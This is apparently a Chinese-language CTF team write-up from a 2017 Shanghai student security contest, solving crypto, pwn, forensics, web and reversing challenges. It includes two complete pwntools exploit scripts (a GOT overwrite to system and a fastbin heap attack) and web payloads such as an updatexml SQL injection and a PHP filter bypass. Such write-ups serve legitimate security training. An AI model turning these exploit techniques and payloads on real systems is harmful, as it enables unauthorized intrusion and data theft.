# 2017年上海大学生信息安全竞赛 

Team: 基因瓢虫

## is aes secure

考察`Padding Oracle`攻击，上网找了个现成的脚本，经过一些更改后即可使用。

详细脚本见 http://fars.ee/os4R/python

## pwn100
程序功能比较简单，无非就是在.bss段前面找一个指针指向.got.plt，在elf头处有很多这样的指针，找`atoi`泄露然后修改为system即可。

主要的利用问题在于向前移位，这里采用“分段”发送的方法：

```python
from pwn import *
r = remote('106.75.8.58', 13579)

back = '4\n'*263007
for i in range(263):
    r.send('4\n'*999)
    r.clean(1)
    r.sendline('4')
    print r.recv()

r.send('4\n'*7)
r.clean(1)
r.sendline('2')
leak = r.recv(6).ljust(8, '\x00')
atoi_addr = u64(leak)

offset_atoi = 0x000000000036e80
offset_system = 0x45390
libc = atoi_addr - offset_atoi
system = offset_system + libc

r.sendline('3')
r.sendline(p64(system))
r.interactive()
```

## 流量分析
FTP流量中有两个`flag.zip`，其中一个是伪加密，处理过后得知`key`不在这里，在SSL流量中。

于是仔细观察FTP流量发现了`key.log`，配入Wireshark即可解密部分SSL流量。通过`ssl && http`查看http报文，发现是百度网盘下载了一个mp3。

频谱分析得到`AaaAaaaAAaaaAAaaaaaaAAAAAaaaaaaa!`，拿去另外一个`flag.zip`解密即可。

## step by step
首先用`wfox`的工具解密phpjiami，发现是三道关卡。

第一关考察`mt_srand`攻击，参考 openwall.com/php_mt_seed 。

第二关为弱类型判断问题，`00`即可绕过。

第三关是绕过正则，`id=php://jpgresource=flag.php`即可。


## p200
fast bin, new string malloc的地址可以盖到指向函数指针列表的指针，修改相应偏移即可。

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

r = remote('106.75.8.58',12333)

r.recvuntil("3. free\n")
r.sendline("3")
r.recvuntil("3. free\n")


r.sendline("2")
r.recvuntil("length:\n")
r.sendline(str(0x30))
r.send(p64(0x602d70))

r.recvuntil("3. free\n")

r.sendline("2")
r.recvuntil("length:\n")
r.sendline("3")
r.send("Tom")

r.recvuntil("3. free\n")

r.sendline("2")
r.recvuntil("length:\n")
r.sendline(str(0x30))
r.send(p64(0x602d90))

r.recvuntil("3. free\n")

r.sendline("2")
r.recvuntil("length:\n")
r.sendline("3")
r.send("Tom")
r.interactive()
```

## pwn300 heap

通过类似`p=&p-0x18`的思想，绕过对自定义随机数的检查，并修改这个全局变量的值。

然后溢出改字符串指针，泄漏got表就可以拿到libc。

之后再控一次全局随机数，来绕过对libc中`/bin/sh`的检查。

最后就是改函数指针，执行`system()`。

详细利用脚本见：http://fars.ee/ndRC

这个利用有成功几率的问题，因为一开始随机化堆分配可能导致后面malloc出来的东西和理想布局不同。

## rrrsa 
1.使用hash扩展攻击可以伪造出符合条件的token成为root用户，从而使用regenkey功能
得到原e0 d0

2.使用getPublickey功能 得到新的e1 n1

3.使用showflag 得到加密过的flag

4.生成新密钥的过程中，p,q,n 均不变，n1=n0，根据e0，d0，n0可接的p，q

5.根据p，q，n，e1可得到d1

7.6.使用d1，n 解密，得到flag明文

## clemency
拿到一个使用了clemency架构的bin文件。

使用clemency模拟器运行该文件，发现该程序只是把输入的flag按照架构定义的9bit编码方式输出。

使用ppp开源的`xxd`从flag.enc还原出flag

## classical
拿到一串使用单表替换加密的密文，通过在线网站解密 http://www.quipqiup.com/ 获得明文。

明文中夹杂了一串无意义的字母和数字，感觉像是base64，但直接解码出的原文无意义。

猜测可能对其中的字母又做了替换。通过暴力方式求解，遍历替换表，得到了原文。


## crackme
拿到一个nspack加壳的二进制文件，使用脱壳工具脱壳，发现程序做了异或变换，做逆变换得到原文。

## Some Words
进入博客网站后，发现id=后存在注入点，过滤规则过滤了单引号、and等，id=后第一个指令没过滤。

尝试使用updatexml注入，updatexml(1,concat(0x7e,(SELECT table_name from information_schema limit 0,1),0x7e),1)

写脚本查出存在一张f14g表，表内有一个f14g字段，再通过updatexml查出表内信息，即为flag。

## Welcome To My Blog

随便点击，发现get方法中有一个action，http://2fa303a375c64b82a5e41b742475471d0c874dca9fef44dd.game.ichunqiu.com/index.php?action=home

将action=flag，查看页面源代码，flag在源代码底部。

## 登机牌

修复二维码识别位点可以得到提示使用binwalk。

下方的二维码使用PS反相后解PDF417编码得到Key1921070120171018。

用010editor打开图片可以发现在末尾处追加了修改了RAR文件头的压缩包，修复后使用上面得到的key解压拿到flag。
